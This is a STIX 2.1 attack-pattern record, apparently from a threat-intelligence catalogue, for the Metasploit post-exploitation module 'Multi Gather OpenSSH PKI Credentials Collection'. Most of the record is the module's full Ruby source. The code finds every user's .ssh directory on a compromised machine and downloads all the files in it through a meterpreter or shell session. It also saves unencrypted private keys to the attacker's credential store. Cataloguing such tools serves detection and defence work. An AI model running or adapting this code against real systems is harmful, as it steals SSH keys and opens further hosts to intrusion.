{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3e75f335-984a-4085-b521-7bf1e014d678",
    "created": "2024-08-14T16:33:19.156441Z",
    "modified": "2024-08-14T16:33:19.156445Z",
    "name": "Multi Gather OpenSSH PKI Credentials Collection",
    "description": " This module will collect the contents of all users' .ssh directories on the targeted machine. Additionally, known_hosts and authorized_keys and any other files are also downloaded. This module is largely based on firefox_creds.rb.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/ssh_creds.rb",
            "external_id": "ssh_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'sshkey'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather OpenSSH PKI Credentials Collection',\n        'Description' => %q{\n          This module will collect the contents of all users' .ssh directories on the targeted\n          machine. Additionally, known_hosts and authorized_keys and any other files are also\n          downloaded. This module is largely based on firefox_creds.rb.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Jim Halfpenny'],\n        'Platform' => %w[bsd linux osx unix],\n        'SessionTypes' => ['meterpreter', 'shell' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_ls\n              stdapi_fs_separator\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    print_status('Finding .ssh directories')\n    paths = enum_user_directories.map { |d| d + '/.ssh' }\n    # Array#select! is only in 1.9\n    paths = paths.select { |d| directory?(d) }\n\n    if paths.nil? || paths.empty?\n      print_error('No users found with a .ssh directory')\n      return\n    end\n\n    print_status(\"Looting #{paths.count} .ssh directories\")\n    download_loot(paths)\n  end\n\n  def download_loot(paths)\n    paths.each do |path|\n      path.chomp!\n\n      print_status(\"Looting #{path} directory\")\n\n      unless executable?(path)\n        print_warning(\"Cannot access directory: #{path} . Missing execute permission. Skipping.\")\n        next\n      end\n\n      if session.type == 'meterpreter'\n        sep = session.fs.file.separator\n        files = session.fs.dir.entries(path)\n      else\n        # Guess, but it's probably right\n        sep = '/'\n        files = cmd_exec(\"ls -1 #{path}\").split(/\\r\\n|\\r|\\n/)\n      end\n      path_array = path.split(sep)\n      path_array.pop\n      user = path_array.pop\n      files.each do |file|\n        next if ['.', '..'].include?(file)\n\n        file_path = \"#{path}#{sep}#{file}\"\n\n        unless readable?(file_path)\n          print_warning(\"Cannot read file: #{file_path} . Missing read permission. Skipping.\")\n          next\n        end\n\n        data = read_file(\"#{path}#{sep}#{file}\")\n        file = file.split(sep).last\n\n        loot_path = store_loot(\"ssh.#{file}\", 'text/plain', session, data, \"ssh_#{file}\", \"OpenSSH #{file} File\")\n        print_good(\"Downloaded #{path}#{sep}#{file} -> #{loot_path}\")\n\n        # store only ssh private keys\n        next if SSHKey.valid_ssh_public_key? data\n\n        begin\n          key = SSHKey.new(data, passphrase: '')\n\n          credential_data = {\n            origin_type: :session,\n            session_id: session_db_id,\n            post_reference_name: refname,\n            private_type: :ssh_key,\n            private_data: key.key_object.to_s,\n            username: user,\n            workspace_id: myworkspace_id\n          }\n\n          create_credential(credential_data)\n        rescue OpenSSL::OpenSSLError => e\n          print_error(\"Could not load SSH Key: #{e.message}\")\n        end\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix]"
    ]
}